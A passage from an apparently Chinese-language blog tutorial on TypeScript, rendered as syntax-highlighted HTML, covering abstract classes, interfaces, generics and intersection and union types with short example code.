class="built_in">console</span>.log(<span class="string">`I'm jumpping`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ani: Animal; <span class="comment">// 允许创建一个对抽象类型的引用</span></span><br><span class="line">ani = <span class="keyword">new</span> Animal(<span class="string">'Bob'</span>); <span class="comment">// 错误: 不能创建一个抽象类的实例</span></span><br><span class="line">ani = <span class="keyword">new</span> Rabbit(<span class="string">'Bob'</span>); <span class="comment">// 允许对一个抽象子类进行实例化和赋值</span></span><br><span class="line">ani.eat();</span><br><span class="line">ani.jump(); <span class="comment">// 错误: 方法在声明的抽象类中不存在</span></span><br></pre></td></tr></table></figure></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="属性接口"><a href="#属性接口" class="headerlink" title="属性接口"></a>属性接口</h2><p>属性接口就是对传入参数的约束。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLabel</span> (<span class="params">labelInfo: &#123; label: <span class="built_in">string</span> &#125;</span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(labelInfo.label);</span><br><span class="line">&#125;</span><br><span class="line">printLabel(&#123; label: <span class="string">'123'</span> &#125;);</span><br></pre></td></tr></table></figure></p><p>我们传入的对象参数实际上会包含很多属性，使用对象传入约束的方式，编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> FullName &#123;</span><br><span class="line">  firstName: <span class="built_in">string</span>;</span><br><span class="line">  secondName: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printName</span> (<span class="params">name: FullName</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name.firstName + name.secondName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  age: <span class="number">20</span>,</span><br><span class="line">  firstName: <span class="string">'Lei'</span>,</span><br><span class="line">  secondName: <span class="string">'Ming'</span></span><br><span class="line">&#125;</span><br><span class="line">printName(obj);</span><br><span class="line">printName(&#123; firstName: <span class="string">'Amy'</span>,secondName:<span class="string">' cooper'</span> &#125;);</span><br></pre></td></tr></table></figure></p><h3 id="可选属性"><a href="#可选属性" class="headerlink" title="可选属性"></a>可选属性</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Info &#123;</span><br><span class="line">  firstName: <span class="built_in">string</span>;</span><br><span class="line">  secondName?: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">info:Info</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(info.firstName)</span><br><span class="line">&#125;</span><br><span class="line">getName(&#123; firstName: <span class="string">'Amy'</span> &#125;);</span><br></pre></td></tr></table></figure><p>结合可选属性，实现ajax函数：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Config &#123;</span><br><span class="line">  <span class="keyword">type</span>: <span class="built_in">string</span>;</span><br><span class="line">  url: <span class="built_in">string</span>;</span><br><span class="line">  data?: <span class="built_in">string</span>;</span><br><span class="line">  dataType: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span> (<span class="params">config: Config</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(config.type, config.url);</span><br><span class="line">  xhr.send(config.data);</span><br><span class="line">  xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.dataType === <span class="string">'json'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> xhr.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">ajax(&#123;</span><br><span class="line">  <span class="keyword">type</span>: <span class="string">'get'</span>,</span><br><span class="line">  url: <span class="string">'https://www.baidu.com'</span>,</span><br><span class="line">  dataType: <span class="string">'json'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="只读属性"><a href="#只读属性" class="headerlink" title="只读属性"></a>只读属性</h3><p>只读属性只能在对象刚刚创建的时候修改其值。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point &#123;</span><br><span class="line">  readonly x: <span class="built_in">number</span>;</span><br><span class="line">  readonly y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p: Point = &#123; x: <span class="number">10</span>, y: <span class="number">20</span> &#125;;</span><br><span class="line">p.x = <span class="number">5</span>; <span class="comment">// 错误，只读属性不可修改</span></span><br></pre></td></tr></table></figure></p><p>TypeScript具有ReadonlyArray<t>类型，它与Array<t>相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> ro: ReadonlyArray&lt;<span class="built_in">number</span>&gt; = a;</span><br><span class="line">ro[<span class="number">0</span>] = <span class="number">12</span>; <span class="comment">// 错误不能修改</span></span><br><span class="line">ro.push(<span class="number">5</span>); <span class="comment">// 错误不能修改</span></span><br><span class="line">ro.length = <span class="number">100</span>; <span class="comment">// 错误不能修改</span></span><br><span class="line">a = ro; <span class="comment">// 错误不能修改</span></span><br></pre></td></tr></table></figure></t></t></p><p>最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。 做为变量使用的话用 const，若做为属性则使用readonly。</p><h2 id="函数类型接口"><a href="#函数类型接口" class="headerlink" title="函数类型接口"></a>函数类型接口</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> encrypt &#123;</span><br><span class="line">  (key: <span class="built_in">string</span>, value: <span class="built_in">string</span>): <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> md5: encrypt = <span class="function"><span class="keyword">function</span> (<span class="params">key: <span class="built_in">string</span>, value: <span class="built_in">string</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> key + value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可索引接口"><a href="#可索引接口" class="headerlink" title="可索引接口"></a>可索引接口</h2><p>TypeScript支持两种索引签名：字符串和数字。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> UserArr &#123;</span><br><span class="line">  [index: <span class="built_in">number</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr3: UserArr = [<span class="string">'aa'</span>, <span class="string">'bb'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> UserObj &#123;</span><br><span class="line">  [index: <span class="built_in">string</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> objArr: UserObj =&#123;name:<span class="string">'Jon'</span>, age: <span class="string">'2'</span>&#125;</span><br></pre></td></tr></table></figure></p><h2 id="类类型接口"><a href="#类类型接口" class="headerlink" title="类类型接口"></a>类类型接口</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Animal &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  eat (str: <span class="built_in">string</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Pig <span class="keyword">implements</span> Animal &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  eat () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`This is pig`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Elephan <span class="keyword">implements</span> Animal &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  eat (food: <span class="built_in">string</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Eat <span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承接口"><a href="#继承接口" class="headerlink" title="继承接口"></a>继承接口</h2><p>一个接口可以继承多个接口，创建出多个接口的合成接口。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Animal &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Cute &#123;</span><br><span class="line">  level: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Rabbit <span class="keyword">extends</span> Animal, Cute &#123;</span><br><span class="line">  age: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rab = &lt;Rabbit&gt;&#123;&#125;;</span><br><span class="line">rab.name = <span class="string">'Haru'</span>;</span><br><span class="line">rab.level = <span class="string">'cutest'</span>;</span><br><span class="line">rab.age = <span class="number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> PP &#123;</span><br><span class="line">  eat(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> P2 <span class="keyword">extends</span> PP &#123;</span><br><span class="line">  work(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Programmer &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  coding(code: <span class="built_in">string</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Web <span class="keyword">extends</span> Programmer <span class="keyword">implements</span> P2&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">  eat() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Eating`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  work() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Working`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ww = <span class="keyword">new</span> Web(<span class="string">'Sara'</span>);</span><br><span class="line">ww.eat()</span><br><span class="line">ww.work()</span><br><span class="line">ww.coding(<span class="string">' python'</span>)</span><br></pre></td></tr></table></figure><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>&lt;<span class="title">T</span>&gt; (<span class="params">value: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line">getData&lt;<span class="built_in">number</span>&gt;(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> MinClass&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">public</span> list: T[] = [];</span><br><span class="line">  add (num: T): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.list.push(num)</span><br><span class="line">  &#125;</span><br><span class="line">  min (): T &#123;</span><br><span class="line">    <span class="keyword">var</span> minNum = <span class="keyword">this</span>.list[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.list.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (minNum &gt; <span class="keyword">this</span>.list[i]) &#123;</span><br><span class="line">        minNum = <span class="keyword">this</span>.list[i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minNum;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> MinClass&lt;<span class="built_in">number</span>&gt;();</span><br><span class="line">m.add(<span class="number">9</span>);</span><br><span class="line">m.add(<span class="number">3</span>);</span><br><span class="line">m.add(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(m.min());</span><br></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一：</span></span><br><span class="line"><span class="keyword">interface</span> ConfigFn &#123;</span><br><span class="line">  &lt;T&gt;(val: T): T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> getDa: ConfigFn = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">val: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">getDa&lt;<span class="built_in">number</span>&gt;(<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：</span></span><br><span class="line"><span class="keyword">interface</span> ConfigFn2&lt;T&gt; &#123;</span><br><span class="line">  (val: T): T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDa2</span>&lt;<span class="title">T</span>&gt;(<span class="params">val: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> myGetDa: ConfigFn2&lt;<span class="built_in">string</span>&gt; = getDa2;</span><br><span class="line"><span class="keyword">var</span> myGetDa2: ConfigFn2&lt;<span class="built_in">string</span>&gt; = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">val: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">myGetDa(<span class="string">'13'</span>);</span><br><span class="line">myGetDa2(<span class="string">'12'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在泛型中继承接口</span></span><br><span class="line"><span class="keyword">interface</span> ConfigFn3 &#123;</span><br><span class="line">  length: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myGetDa3</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">ConfigFn3</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">myGetDa3(<span class="number">3</span>); <span class="comment">// 错误，传入参数有限制</span></span><br><span class="line">myGetDa3(&#123;length: <span class="number">10</span>, value: <span class="number">3</span>&#125;); <span class="comment">// 成功</span></span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>利用泛型实现一个数据库类。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> DBI&lt;T&gt; &#123;</span><br><span class="line">  add(info:T): <span class="built_in">boolean</span>;</span><br><span class="line">  update(info:T, id:<span class="built_in">number</span>): <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="keyword">delete</span>(id:<span class="built_in">number</span>): <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="keyword">get</span>(id:<span class="built_in">number</span>):<span class="built_in">any</span>[];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> MysqlDb&lt;T&gt; <span class="keyword">implements</span> DBI&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Connecting DB`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  add(info: T): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(info);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  update(info: T, id: <span class="built_in">number</span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span>(id: <span class="built_in">number</span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span>(id: <span class="built_in">number</span>): <span class="built_in">any</span>[] &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> MssqlDb&lt;T&gt; <span class="keyword">implements</span> DBI&lt;T&gt; &#123;</span><br><span class="line">  add(info: T): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  update(info: T, id: <span class="built_in">number</span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span>(id: <span class="built_in">number</span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span>(id: <span class="built_in">number</span>): <span class="built_in">any</span>[] &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Method not implemented."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="高级类型"><a href="#高级类型" class="headerlink" title="高级类型"></a>高级类型</h1><h2 id="交叉类型"><a href="#交叉类型" class="headerlink" title="交叉类型"></a>交叉类型</h2><p>使用<code>&amp;</code>合并两个类，这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>&lt;<span class="title">T</span>, <span class="title">U</span>&gt;(<span class="params">first: T, second: U</span>): <span class="title">T</span> &amp; <span class="title">U</span> </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = &lt;T &amp; U&gt;&#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> id <span class="keyword">in</span> first) &#123;</span><br><span class="line">    (&lt;<span class="built_in">any</span>&gt;result)[id] = (&lt;<span class="built_in">any</span>&gt;first)[id];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> id <span class="keyword">in</span> second) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!result.hasOwnProperty(id)) &#123;</span><br><span class="line">      (&lt;<span class="built_in">any</span>&gt;result)[id] = (&lt;<span class="built_in">any</span>&gt;second)[id];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Loggable &#123;</span><br><span class="line">  log(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> ConsoleLogger <span class="keyword">implements</span> Loggable &#123;</span><br><span class="line">  log() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> jim = extend(<span class="keyword">new</span> Person(<span class="string">"Jim"</span>), <span class="keyword">new</span> ConsoleLogger());</span><br><span class="line"><span class="keyword">var</span> n = jim.name;</span><br><span class="line">jim.log();</span><br></pre></td></tr></table></figure></p><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> uniType: <span class="built_in">string</span> | <span class="built_in">number</span>;</span><br><span class="line">uniType = <span class="number">1</span>;  <span class="comment">// 正确</span></span><br><span class="line">uniType = <span class="string">'2'</span>; <span class="comment">// 正确</span></span><br><span class="line">uniType = <span class="literal">true</span>; <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><p>如果一个值是联合类型，我们只能访问此联合类型的所有类型里共有的成员。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Bird &#123;</span><br><span class="line">  fly();</span><br><span class="line">  layEggs();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Fish &#123;</span><br><span class="line">  swim();</span><br><span class="line">  layEggs();</span><br><span 